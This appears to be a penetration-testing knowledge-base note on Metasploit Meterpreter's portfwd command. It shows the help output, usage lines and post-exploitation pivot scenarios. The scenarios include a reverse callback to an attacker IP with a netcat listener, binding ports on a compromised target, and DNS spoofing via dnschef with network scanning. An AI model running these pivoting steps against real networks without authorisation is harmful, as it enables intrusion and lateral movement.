---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - scenarios
  - metasploit-framework
  - cross-platform
credits:
  - Abed Samhuri
  - Borja Merino
---
# Metasploit

## 01 - Help Menu

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

## 02 - Usage

Bind port from the target.

```
meterpreter > portfwd add -l -r <target_IP> <local_port> -p <bind_port>
```

Reverse port forwarding from the compromised target.

```
meterpreter > portfwd add -R -L <attacker_IP> -r <compromised_target_IP> -l <local_port> -p <bind_port>
```

List active port forwarding rules.

```
meterpreter > portfwd list
```

Remove port forward rule.

```
meterpreter > portfwd delete -r <target_IP> -l <local_port> -p <bind_port>
```

Remove all port forwarding rules

```
meterpreter > portfwd flush
```

## 03 - Scenarios

### 3.1 - Shell Handler Reverse Callback Session

```
meterpreter > portfwd add -R -L <attacker_IP> -l 5986 -p 5986

$ nc -lnvp 5986
```

### 3.2 - Bind port and exploit

```
meterpreter > portfwd add -r <target_IP> -l <local_port> -p <bind_port>
```

### 3.3 - Bind ISCSI port and mount it

Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Cross Platform/File Server/ISCSI|section]] after a successful port forwarding.

```
meterpreter > portfwd add -r <target_IP> -l <local_port> -p 3260

# iptables -t nat -A OUTPUT -p tcp --dport 3260 -d <target_IP> -j DNAT --to-destination 127.0.0.1:<local_port>
```

### 3.4 - Reverse Bind Port Forwarding

This method is similar to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x06 - Pivot/Cross Platform/P2P Callback Implants/Metasploit|section]] but solely used with `portfwd` by binding it to a compromised target and can be used with not just a shell handler (or C2 frameworks), but with hosting a web server, FTP, etc.

```
meterpreter > portfwd add -R -L <attacker_IP> -l <local_port> -p <bind_port> -r <compromised_target_IP>
```

### 3.5 - DNS Port Forwarding To Perform Quick Recon

> [!NOTE]
> You must be connected in a **LAN (Local Area Network)** as this doesn't require SOCKS proxy server since this scenario does not involve when it's connected from outside the internet.

TODO: Refer to the links (under Scenarios section) with [[DNSChef]] or use just netcat to listen port 53 instead

```
meterpreter > portfwd add -r <target_IP> -l <local_port> -L 127.0.0.1 -p 53
```

```
root@hackware-os:~# dnschef --fakedomains <domain>.<tld> --fakeip '<attacker_IP>' fakealias www.<domain>.<tld> --fakens ns.<domain>.<tld> -p <local_port> -q
```

```
root@hackware-os:~# mkfifo /tmp/fifo

root@hackware-os:~# nc -lup 53 < /tmp/fifo | nc localhost 6667 > /tmp/fifo

root@hackware-os:~# cat /etc/resolv.conf
..[omitted]..
nameserver 127.0.0.1

$ cat /etc/dnsmasq.conf
..[omitted]..
```

Scan the network via DNS lookup.

```
$ for ip in 192.168.1.{1..254}; do $(host $ip 127.0.0.1); done

$ nmap -sL --dns-servers 127.0.0.1 192.168.1.0/24
```

---
## References

### Metasploit Unleashed

- [Metasploit Unleashed: Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)

### RawSec

- [noraj: Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

### Scenarios

#### MrAcouch

- [MrAcouch:  Basic Pivoting Techniques - Putting it all together (meterpreter and covenant) ](https://www.youtube.com/watch?v=DbC195f288c)

#### Abed Samhuri

- [Abed Samhuri: How to Implement Pivoting and Relaying Techniques Using Meterpreter](https://medium.com/axon-technologies/how-to-implement-pivoting-and-relaying-techniques-using-meterpreter-b6f5ec666795)

#### Hacking Tutorials

- [Hacking Tutorials: Port forwarding - Accessing local ports remotely](https://www.hackingtutorials.org/metasploit-tutorials/metasploitable-3-port-forwarding/)

#### Security Art Work

- [Security Art Work: DNS Port Forwarding con Meterpreter](https://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/)